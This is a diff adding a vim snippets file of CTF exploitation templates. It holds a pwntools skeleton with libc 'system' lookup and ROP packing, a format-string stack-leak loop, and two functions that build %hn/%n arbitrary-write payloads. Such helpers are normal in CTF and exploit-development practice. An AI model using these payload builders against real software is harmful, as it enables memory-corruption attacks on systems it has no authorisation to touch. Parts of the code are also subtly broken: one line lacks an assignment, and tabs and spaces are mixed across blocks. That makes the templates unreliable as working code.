@@ -1,0 +1,138 @@
+##########################
+# CTF python snippeets   #
+##########################
+
+snippet t-pwn "pwn template for CTFs" b
+#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+
+from pwn import *
+
+LOCAL = "remote" not in sys.argv
+BINARY = "${1:binary_name}"
+
+elf = ELF(BINARY)
+context(terminal = ["tmux", "splitw"])
+context.update(binary=elf)
+context.log_level "debug" if "debug" in sys.argv else "info"
+
+LIBC = None
+
+if LOCAL:
+    r = remote("127.0.0.1", 1337)
+else:
+    r = remote("${2:ip_address}", ${3:port})
+
+libc = ELF(LIBC) if LIBC else elf.libc
+system = libc.symbols["system"]
+
+if "gdb" in sys.argv:
+	gdb_cmd = []
+	gdb_cmd.append("""
+	b *0x31337
+	""")
+	gdb_cmd.append("c")
+	gdb_cmd = "\n".join(gdb_cmd)
+    gdb.attach(BINARY, execute=gdb_cmd)
+
+
+# OR USE
+# flat(0, 0x424242, "ABCDEFGH", -0x1337, sign=True)
+def rop(rop):
+	"""Pack array of addresses"""
+	return "".join(pack(_) for _ in rop)
+
+$0
+
+endsnippet
+
+snippet t-fmtstr "format string leak template" b
+def fmt_string(payload):
+	r.sendline(payload)
+
+log.info("Format string leak")
+for offset in range(100):
+    payload = ("%" + str(offset) + "$llx.").ljust(64, "B") + "A" * 16
+	fmt_string(payload)
+	leak = r.readuntil("\n").split(".BBBBBB")[0]
+	print("Offset %d: %s" % (offset, leak))
+	if offset == OFFSET_TO_CHOOSE:
+	    libc_leak = int(leak, 16)
+	if leak == ("A"*8).encode("hex"):
+	    break
+
+endsnippet
+
+snippet fmtstr-2 "write format string payload 2 by 2" b
+
+def two_by_two(addr, value, offset, main=False):
+    hob = value >> 16
+    lob = value & 0xffff
+    if hob < lob:
+        first = hob - 8
+        second = lob - hob
+        offset_1 = offset
+        offset_2 = offset + 1
+    else:
+        first = lob - 8
+        second = hob - lob
+        offset_1 = offset + 1
+        offset_2 = offset
+    addr_1 = pack(addr)
+    addr_2 = pack(addr + 2)
+    if main is True:
+        fs = "{0}{1}%{2}x%{3}$hn%{4}x%{5}$hn".format(
+            "".join('\\x{:02x}'.format(ord(c)) for c in addr_2),
+            "".join('\\x{:02x}'.format(ord(c)) for c in addr_1),
+            first, offset_1, second, offset_2)
+    else:
+        fs = "{0}{1}%{2}x%{3}$hn%{4}x%{5}$hn".format(
+            bytes(addr_2), bytes(addr_1),
+            first, offset_1, second, offset_2)
+    return fs
+
+endsnippet
+
+snippet fmtstr-1 "write format string payload 1 by 1" b
+
+def one_by_one(addr, value, offset, main=False):
+    b = [value >> 24, (value >> 16) & 0xff, (value & 0xffff) >> 8, value & 0xff]
+    first = b[3] - 16
+    if b[2] < b[3]:
+        second = 0x100 - (b[3] - b[2])
+    else:
+        second = b[2] - b[3]
+    if b[1] < b[2]:
+        third = 0x100 - (b[2] - b[1])
+    else:
+        third = b[1] - b[2]
+    if b[0] < b[1]:
+        fourth = 0x100 - (b[1] - b[0])
+    else:
+        fourth = b[0] - b[1]
+    fs = ""
+    for i, delta in enumerate([first, second, third, fourth]):
+        if delta > 0:
+            fs += "%{0}x%{1}$n".format(delta, offset+i)
+        else:
+            fs += "%{0}$n".format(offset+i)
+    if main is True:
+        fs = "{0}{1}{2}{3}".format(
+            "".join('\\x{:02x}'.format(ord(c)) for c in pack(addr)),
+            "".join('\\x{:02x}'.format(ord(c)) for c in pack(addr+1)),
+            "".join('\\x{:02x}'.format(ord(c)) for c in pack(addr+2)),
+            "".join('\\x{:02x}'.format(ord(c)) for c in pack(addr+3))
+        ) + fs
+    else:
+        fs = "{0}{1}{2}{3}".format(
+            bytes(pack(addr)),
+            bytes(pack(addr+1)),
+            bytes(pack(addr+2)),
+            bytes(pack(addr+3))
+        ) + fs
+    return fs
+
+endsnippet
+
+# vim:ft=snippets:
+
